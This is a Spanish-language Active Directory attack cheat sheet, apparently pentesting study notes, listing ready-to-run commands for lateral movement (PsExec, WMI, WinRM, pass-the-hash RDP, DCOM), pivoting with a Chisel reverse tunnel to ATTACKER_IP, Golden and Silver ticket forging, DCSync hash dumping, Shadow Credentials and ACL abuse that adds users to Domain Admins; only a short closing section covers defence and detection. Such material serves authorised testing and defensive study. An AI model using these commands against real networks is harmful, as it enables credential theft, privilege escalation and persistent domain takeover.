# Lateral Movement

## Técnicas de Movimiento Lateral

### **PsExec**

```bash
# Con Impacket
impacket-psexec ejemplo.com/usuario:password@10.10.10.101

# Con hash
impacket-psexec -hashes :HASH Administrator@10.10.10.101

# Metasploit
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.101
set SMBUser Administrator
set SMBPass password
exploit
```

---

### **WMI (Windows Management Instrumentation)**

```bash
# Con Impacket
impacket-wmiexec ejemplo.com/usuario:password@10.10.10.101

# Con hash
impacket-wmiexec -hashes :HASH Administrator@10.10.10.101

# PowerShell local
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName TARGET
```

---

### **WinRM (Windows Remote Management)**

```bash
# Con evil-winrm
evil-winrm -i 10.10.10.101 -u Administrator -p password

# Con hash
evil-winrm -i 10.10.10.101 -u Administrator -H HASH

# PowerShell
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)
```

---

### **RDP (Remote Desktop)**

```bash
# Con xfreerdp
xfreerdp /u:Administrator /p:password /v:10.10.10.101 /cert:ignore

# Con hash (Restricted Admin mode)
xfreerdp /u:Administrator /pth:HASH /v:10.10.10.101 /cert:ignore

# Habilitar Restricted Admin
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f
```

---

### **DCOM (Distributed COM)**

```powershell
# MMC20.Application
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","")

# ShellWindows
$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$com.Item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)
```

---

## Pivoting en AD

### **SSH Tunneling**

```bash
# Local port forward
ssh -L 8080:10.10.10.100:80 user@pivot-host

# Dynamic port forward (SOCKS proxy)
ssh -D 1080 user@pivot-host

# Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Usar con herramientas
proxychains crackmapexec smb 10.10.10.0/24
```

---

### **Chisel**

```bash
# En atacante (servidor)
./chisel server -p 8000 --reverse

# En víctima (cliente)
./chisel client ATTACKER_IP:8000 R:socks

# Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
```

---

### **Meterpreter Routing**

```bash
# Desde Meterpreter
run autoroute -s 10.10.10.0/24

# Port forwarding
portfwd add -l 445 -p 445 -r 10.10.10.100

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```

---

# Domain Dominance

## Golden Ticket

### **¿Qué es?**

```
Ticket Kerberos forjado con hash de krbtgt

Permite:
• Autenticarse como cualquier usuario
• Acceso a cualquier recurso
• Persistencia indefinida (hasta cambio de krbtgt)

Requiere:
• Hash de krbtgt
• SID del dominio
• Nombre del dominio
```

---

### **Obtener Datos Necesarios**

```bash
# Desde DC con mimikatz
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt

# Desde Kali con secretsdump
impacket-secretsdump ejemplo.com/Administrator:password@DC01.ejemplo.com

# Información necesaria:
# • krbtgt NTLM hash
# • Domain SID: S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX
# • Domain name: EJEMPLO.COM
```

---

### **Crear Golden Ticket**

```bash
# Con mimikatz (Windows)
mimikatz # kerberos::golden /user:Administrator /domain:ejemplo.com /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX /krbtgt:HASH /id:500 /ptt

# Verificar
klist

# Con Impacket (Linux)
impacket-ticketer -nthash HASH -domain-sid S-1-5-21-XXX -domain ejemplo.com Administrator

# Usar ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec ejemplo.com/Administrator@DC01.ejemplo.com -k -no-pass
```

---

## Silver Ticket

### **¿Qué es?**

```
Ticket forjado para servicio específico

Diferencias con Golden:
• Solo para un servicio (CIFS, HTTP, SQL, etc.)
• Usa hash de cuenta de servicio (no krbtgt)
• Menos detección
• Acceso limitado

Requiere:
• Hash de cuenta del servicio
• SPN del servicio
• SID del dominio
```

---

### **Crear Silver Ticket**

```bash
# Con mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:ejemplo.com /sid:S-1-5-21-XXX /target:sql01.ejemplo.com /service:MSSQLSvc /rc4:HASH /ptt

# Servicios comunes:
# CIFS - Acceso a archivos
# HTTP - Web services
# LDAP - Directory queries
# MSSQLSvc - SQL Server
# HOST - Tareas programadas, WMI
```

---

## DCSync

### **¿Qué es?**

```
Ataque para replicar datos de AD como si fuera un DC

Permite:
• Obtener hashes de todos los usuarios
• Extraer krbtgt hash
• No necesita ejecutar código en DC

Requiere:
• Permisos de replicación:
  - Replicating Directory Changes
  - Replicating Directory Changes All
  - Replicating Directory Changes In Filtered Set

Por defecto: Domain Admins, Enterprise Admins
```

---

### **Ejecución**

```bash
# Con mimikatz (Windows)
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # lsadump::dcsync /user:Administrator
mimikatz # lsadump::dcsync /domain:ejemplo.com /all /csv

# Con Impacket (Linux)
impacket-secretsdump ejemplo.com/Administrator:password@DC01.ejemplo.com

# Output: todos los hashes NTLM del dominio
```

---

## Shadow Credentials

```powershell
# Con Whisker
.\Whisker.exe add /target:TARGET_USER

# Autenticarse con certificado generado
.\Rubeus.exe asktgt /user:TARGET_USER /certificate:CERT /password:PASSWORD /getcredentials
```

---

# BloodHound

## ¿Qué es BloodHound?

```
Herramienta de análisis visual de AD

Identifica:
• Rutas de ataque
• Relaciones entre objetos
• Permisos y ACLs
• Shortest path to Domain Admin

Componentes:
• Neo4j (base de datos graph)
• BloodHound GUI
• SharpHound (collector)
```

---

## Instalación y Uso

### **Instalación**

```bash
# Instalar Neo4j
sudo apt install neo4j

# Iniciar Neo4j
sudo neo4j console

# Acceder a: http://localhost:7474
# Credenciales default: neo4j/neo4j
# Cambiar password

# Instalar BloodHound
sudo apt install bloodhound

# Ejecutar
bloodhound
```

---

### **Recolección de Datos**

```bash
# Desde Windows con SharpHound
.\SharpHound.exe -c All

# Todas las colecciones
.\SharpHound.exe -c All,GPOLocalGroup

# Solo sesiones
.\SharpHound.exe -c Session

# Con credenciales específicas
.\SharpHound.exe -c All -d ejemplo.com --domaincontroller DC01.ejemplo.com

# Desde Linux con bloodhound-python
bloodhound-python -u usuario -p password -d ejemplo.com -dc dc01.ejemplo.com -c All

# Output: archivos .json
# Importar en BloodHound
```

---

## Análisis con BloodHound

### **Queries Predefinidas**

```
Analysis Tab:

• Find all Domain Admins
• Find Shortest Paths to Domain Admins
• Find Principals with DCSync Rights
• Users with Foreign Domain Group Membership
• Groups with Foreign Domain Group Membership
• Map Domain Trusts
• Shortest Paths to Unconstrained Delegation Systems
• Shortest Paths from Kerberoastable Users
• Shortest Paths to Domain Admins from Owned Principals
```

---

### **Queries Personalizadas (Cypher)**

```cypher
# Encontrar todos los administradores
MATCH (u:User)-[r:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@EJEMPLO.COM"})
RETURN u

# Usuarios con DCSync
MATCH (u:User)-[r:MemberOf*1..]->(g:Group)
WHERE g.objectid ENDS WITH "-512" OR g.objectid ENDS WITH "-519"
RETURN u

# Equipos con Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c

# Shortest path de usuario a Domain Admin
MATCH p=shortestPath((u:User {name:"USUARIO@EJEMPLO.COM"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@EJEMPLO.COM"}))
RETURN p
```

---

### **Marcar Como Owned**

```
1. Clic derecho en nodo
2. "Mark User as Owned"
3. Query: "Shortest Paths to Domain Admins from Owned Principals"

Identifica rutas de ataque desde tus compromisos actuales
```

---

## Explotación Guiada por BloodHound

### **Ejemplo: Ruta a Domain Admin**

```
BloodHound identifica:

USER01 → GenericAll → USER02
USER02 → MemberOf → IT_SUPPORT
IT_SUPPORT → GenericWrite → ADMIN_SERVER$
ADMIN_SERVER$ → AdminTo → DC01
DC01 → Contains → krbtgt

Pasos de explotación:

1. Comprometer USER01 (inicial)
2. Usar GenericAll para resetear password de USER02
3. USER02 es miembro de IT_SUPPORT
4. IT_SUPPORT tiene GenericWrite en ADMIN_SERVER$
5. Modificar ADMIN_SERVER$ (Shadow Credentials o Resource-Based Constrained Delegation)
6. Obtener privilegios en DC01
7. DCSync para extraer krbtgt
8. Golden Ticket
```

---

### **Abusar de ACLs**

```powershell
# ForceChangePassword
$NewPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity usuario -AccountPassword $NewPass

# GenericAll sobre usuario
Add-DomainGroupMember -Identity 'Domain Admins' -Members usuario

# GenericAll sobre grupo
Add-DomainGroupMember -Identity 'Domain Admins' -Members usuario

# WriteDACL
Add-DomainObjectAcl -TargetIdentity "DC=ejemplo,DC=com" -PrincipalIdentity usuario -Rights DCSync
```

---

# Defensa y Detección

## Mejores Prácticas

```
1. Password Policy
   • Passwords complejos (15+ caracteres)
   • MFA para administradores
   • Cambiar krbtgt regularmente

2. Privilegios Mínimos
   • No usar Domain Admin para tareas diarias
   • Separate admin accounts
   • Just-In-Time Admin Access

3. Monitoreo
   • Logs de autenticación
   • Detectar Kerberoasting (Event ID 4769)
   • Detectar DCSync (Event ID 4662)

4. Segmentación
   • Separate Domain Controllers
   • PAW (Privileged Access Workstations)
   • Tier Model

5. Hardening
   • Deshabilitar NTLM
   • SMB signing
   • LDAP signing
   • Credential Guard
```

---

## Detección de Ataques

```
Kerberoasting:
• Event ID 4769 (TGS Request)
• Encryption type: RC4 (0x17)

AS-REP Roasting:
• Usuarios sin pre-autenticación

Golden Ticket:
• Tickets con lifetime anormal
• TGT sin evento de autenticación

DCSync:
• Event ID 4662
• Directory Services Access

Pass-the-Hash:
• Logins con NTLM desde máquinas inusuales
• Event ID 4624 (logon type 3)
```